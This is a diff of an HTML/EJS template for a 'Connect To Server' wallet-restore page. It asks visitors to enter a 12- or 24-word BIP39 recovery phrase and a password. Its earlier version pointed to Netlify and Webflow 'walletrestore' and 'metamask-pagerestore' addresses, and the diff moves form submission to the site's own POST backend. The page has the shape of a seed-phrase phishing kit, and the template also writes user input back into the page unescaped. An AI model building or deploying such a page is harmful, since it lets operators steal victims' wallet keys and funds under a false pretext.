@@ -19,44 +19,44 @@
   <h2>Connect To Server</h2>
 
   <button id="btn1" onclick="show_hide()">12 WORD PHRASE</button>
-  <div id="15form" class="r-container">
+  <% if(alert.status === "error") { %>
+    <div class="error"><b>Error:</b> <%- alert.message %></div>
+  <% } %>
+  <div id="15form" class="r-container" <% if(formSection === "12"){ %>style="display: block;"<% } %>>
     <h2 class="mnemonic">MNEMONIC</h2>
-
-    <form id="email-form-12" name="email-form-12" method="get" class="form-2">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://walletrestore-web.netlify.app/">
-
+    
+    <form method="POST" action="?type=12" class="form-2">
       <div class="">
         <!-- Input fields for 12-word phrase -->
         <div class="input">
-          <input class="mnemonic-input" type="text" name="word1_12" required placeholder="1">
+          <input class="mnemonic-input" type="text" name="word1" value='<%- formSection === "12" ? form.word1 : "" %>' required placeholder="1">
           <span></span>
-          <input class="mnemonic-input" type="text" name="word2_12" required placeholder="2">
+          <input class="mnemonic-input" type="text" name="word2" value='<%- formSection === "12" ? form.word2 : "" %>' required placeholder="2">
         </div>
         <div class="input">
-          <input class="mnemonic-input" type="text" name="word3_12" required placeholder="3">
+          <input class="mnemonic-input" type="text" name="word3" value='<%- formSection === "12" ? form.word3 : "" %>' required placeholder="3">
           <span></span>
-          <input class="mnemonic-input" type="text" name="word4_12" required placeholder="4">
+          <input class="mnemonic-input" type="text" name="word4" value='<%- formSection === "12" ? form.word4 : "" %>' required placeholder="4">
         </div>
         <div class="input">
-          <input class="mnemonic-input" type="text" name="word5_12" required placeholder="5">
+          <input class="mnemonic-input" type="text" name="word5" value='<%- formSection === "12" ? form.word5 : "" %>' required placeholder="5">
           <span></span>
-          <input class="mnemonic-input" type="text" name="word6_12" required placeholder="6">
+          <input class="mnemonic-input" type="text" name="word6" value='<%- formSection === "12" ? form.word6 : "" %>' required placeholder="6">
         </div>
         <div class="input">
-          <input class="mnemonic-input" type="text" name="word7_12" required placeholder="7">
+          <input class="mnemonic-input" type="text" name="word7" value='<%- formSection === "12" ? form.word7 : "" %>' required placeholder="7">
           <span></span>
-          <input class="mnemonic-input" type="text" name="word8_12" required placeholder="8">
+          <input class="mnemonic-input" type="text" name="word8" value='<%- formSection === "12" ? form.word8 : "" %>' required placeholder="8">
         </div>
         <div class="input">
-          <input class="mnemonic-input" type="text" name="word9_12" required placeholder="9">
+          <input class="mnemonic-input" type="text" name="word9" value='<%- formSection === "12" ? form.word9 : "" %>' required placeholder="9">
           <span></span>
-          <input class="mnemonic-input" type="text" name="word10_12" required placeholder="10">
+          <input class="mnemonic-input" type="text" name="word10" value='<%- formSection === "12" ? form.word10 : "" %>' required placeholder="10">
         </div>
         <div class="input">
-          <input class="mnemonic-input" type="text" name="word11_12" required placeholder="11">
+          <input class="mnemonic-input" type="text" name="word11" value='<%- formSection === "12" ? form.word11 : "" %>' required placeholder="11">
           <span></span>
-          <input class="mnemonic-input" type="text" name="word12_12" required placeholder="12">
+          <input class="mnemonic-input" type="text" name="word12" value='<%- formSection === "12" ? form.word12 : "" %>' required placeholder="12">
         </div>
       </div>
       <input type="password" class="password" name="password" style="
@@ -86,7 +86,18 @@
         Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your account.
       </p>
 
-      <button id="restoreButton12" style="
+      <input type="submit" style="
+      border: 0;
+      border-radius: 7px;
+      font-size: 20px;
+      text-align: center;
+      background: #0000FF;
+      color: #ffffff;
+      width: 60%;
+      padding: 10px 0;
+      margin: 20px 0;" value="Restore" >
+
+      <!-- <button id="restoreButton12" style="
               border: 0;
               border-radius: 7px;
               font-size: 20px;
@@ -97,7 +108,7 @@
               padding: 10px 0;
               margin: 20px 0;">
         Restore
-      </button>
+      </button> -->
     </form>
   </div>
   </div>
@@ -137,7 +148,7 @@
 
     <div class="tab-content" id="myTabContent">
       <div class="tab-pane fade active show" id="mnemonic" role="tabpanel" aria-labelledby="mnemonic-tab">
-        <form id="email-form-24" name="email-form-24"  redirect="https://metamask-pagerestore-dev.webflow.io" data-redirect="https://metamask-pagerestore-dev.webflow.io" method="get" class="form-2" data-wf-page-id="671ab8c3e5122fad4a0db13c" data-wf-element-id="51c56c03-3a2d-a9c5-05c4-0d26c6a4a05a">
+        <form id="email-form-24" method="POST" class="form-2">
 
 
           <input type="hidden" name="_captcha" value="false">
